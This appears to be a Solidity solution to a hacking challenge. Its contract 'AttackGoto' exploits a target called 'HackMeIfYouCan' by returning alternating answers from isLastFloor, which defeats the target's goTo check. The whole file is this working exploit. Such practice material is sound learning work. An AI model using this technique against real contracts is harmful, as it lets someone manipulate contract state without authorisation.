// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.7.0;

import "./HackMeIfYouCan.sol";

contract AttackGoto is Building {
    HackMeIfYouCan public hackMeContract;
    bool public toggle;

    constructor(address payable _hackMeContract) {
        hackMeContract = HackMeIfYouCan(_hackMeContract);
    }

    function isLastFloor(uint256) external override returns (bool) {
        toggle = !toggle;
        return toggle;
    }

    function attack(uint256 _floor) public {
        hackMeContract.goTo(_floor);
    }
}
